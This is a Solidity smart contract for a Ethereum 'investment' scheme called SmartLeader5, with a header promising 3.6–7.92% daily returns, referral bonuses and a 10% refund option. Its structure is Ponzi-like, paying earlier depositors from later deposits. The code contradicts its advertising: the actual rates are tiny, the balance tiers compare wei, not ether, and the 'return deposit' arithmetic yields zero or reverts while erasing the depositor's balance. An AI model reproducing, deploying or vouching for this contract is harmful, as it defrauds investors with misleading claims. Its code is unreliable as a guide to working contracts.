pragma solidity ^0.4.25;

/**
* SmartLeader5 contract
*    7% commission for advertising
*    Without owner and backdoors
*    10% referral program
*    You can get back your deposit with commission 10%
* 
* Investment plan
*   0-500 eth on contract balance | 3.6% per 24h
*   500-1500  | 5.04%
*   1500-3000 | 6.48%
*   3000-inf  | 7.92%
* 
* How to use the contract:
*   1. Send any deposit to make an investment
*   2. Claim your profit by sending 0 ether
*   You can make more deposits or reinvest, don&#39;t worry
* 
* How to use referral program:
*   1. Share your address
*   2. Your referral should put the address in the Data field when he makes a deposit
*   3. Check the Internal transactions, you got your 10%!
* 
*/

//Math operations with safety checks that revert on error
library SafeMath {
  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
    if (_a == 0) {
      return 0;
    }
    c = _a * _b;
    assert(c / _a == _b);
    return c;
  }

  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
    assert(_b > 0);
    return _a / _b;
  }

  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
    assert(_b <= _a);
    return _a - _b;
  }

  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
    c = _a + _b;
    assert(c >= _a);
    return c;
  }
}

contract SmartLeader {
	using SafeMath for uint256;
	
    // Advertising address
	address public constant advAddress = 0x01949fB2045CA0a969Df5Af7D49829477b81B042;

    //Saving data
	mapping (address => uint256) deposited;
	mapping (address => uint256) withdrew;
	mapping (address => uint256) refearned;
	mapping (address => uint256) blocklock;

    //Information about contract
	uint256 public totalDepositedWei = 0;
	uint256 public totalWithdrewWei = 0;
	
	//Percent rate steps
	uint256 public startPer = 15;
	uint256 public lowPer = 21;
	uint256 public midPer = 27;
	uint256 public highPer = 33;
	//Contract balance steps
	uint256 public lowBal = 500;
	uint256 public midBal = 1500;
	uint256 public highBal = 3000;
	
	//Calc percent rate
    function percentRate() public view returns (uint256) {
        uint balance = address(this).balance;
        
        if (balance < lowBal) {
            return (startPer);
        }
        if (balance >= lowBal && balance < midBal) {
            return (lowPer);
        }
        if (balance >= midBal && balance < highBal) {
            return (midPer);
        }
        if (balance >= highBal) {
            return (highPer);
        }
    }


    //Deposit
	function() payable external {
        
        //Return deposit
	    if (msg.value == 0.00002015 ether) {
	        uint256 withdrawalAmount = deposited[msg.sender].sub(withdrew[msg.sender]).sub(deposited[msg.sender]).div(10);
	        require(deposited[msg.sender] > withdrawalAmount, &#39;You have already repaid your deposit&#39;);
	        deposited[msg.sender] = 0;
	        withdrew[msg.sender] = 0;
	        blocklock[msg.sender] = 0;
	        msg.sender.transfer(withdrawalAmount);
	    }
	    else {
    	    //Referral and advertising percents
    		uint256 advPerc = msg.value.mul(7).div(100);
    		uint256 refPerc = msg.value.mul(10).div(100);
    
            advAddress.transfer(advPerc);
    
            //Receiving percents
    		if (deposited[msg.sender] != 0) {
    			address investor = msg.sender;
    			uint256 depositsPercents = deposited[msg.sender].mul(block.number-blocklock[msg.sender]).div(5900).mul(percentRate()).div(10000);
    			investor.transfer(depositsPercents);
    
    			withdrew[msg.sender] += depositsPercents;
    			totalWithdrewWei = totalWithdrewWei.add(depositsPercents);
    		}
    
    		//Referral program
    		address referrer = bytesToAddress(msg.data);
    		if (referrer > 0x0 && referrer != msg.sender) {
    			referrer.transfer(refPerc);
    
    			refearned[referrer] += refPerc;
    		}
    
    		blocklock[msg.sender] = block.number;
    		deposited[msg.sender] += msg.value;
    
    		totalDepositedWei = totalDepositedWei.add(msg.value);
	    }
	}

    //Information about your deposit
	function userDepositedWei(address _address) public view returns (uint256) {
		return deposited[_address];
    }

	function userWithdrewWei(address _address) public view returns (uint256) {
		return withdrew[_address];
    }

	function userDividendsWei(address _address) public view returns (uint256) {
		return deposited[_address].mul(block.number-blocklock[_address]).div(5900).mul(5).div(100);
    }

	function userReferralsWei(address _address) public view returns (uint256) {
		return refearned[_address];
    }

	function bytesToAddress(bytes bys) private pure returns (address addr) {
		assembly {
			addr := mload(add(bys, 20))
		}
	}
}